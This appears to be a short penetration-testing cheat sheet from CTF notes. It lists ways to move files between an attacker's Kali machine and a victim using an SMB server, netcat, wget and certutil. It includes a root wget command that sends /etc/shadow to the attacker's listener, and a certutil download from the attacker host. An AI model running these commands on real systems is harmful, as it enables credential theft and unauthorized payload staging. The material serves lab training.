# Transferring Files

## **SMB**

**Kali**

```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Victim**

```
copy C:\File\to\tranfer.exe \\$KALI\public\
```

## Netcat

### Send File

**Kali(receiving)**

```
nc -l -p 1234 > user.jpg
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < user.jpg
```

## wget

### Download File

**Victim (receiving)**

```
wget http://$VICTIM/$FILE

#From non-strandard port
wget http://$VICTIM:81/$FILE
```

### Send File

**Examples**

[wgel-ctf.md](../walkthroughs/tryhackme/wgel-ctf.md "mention")

**Kali(receiving)**

```
nc -lvnp 4444
```

**Victim(sending)**

```
sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
```



## **certutil**

**Example**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

**Victim**&#x20;

```
certutil -urlcache -f http://$KALI:81/$FILE $FILE
```



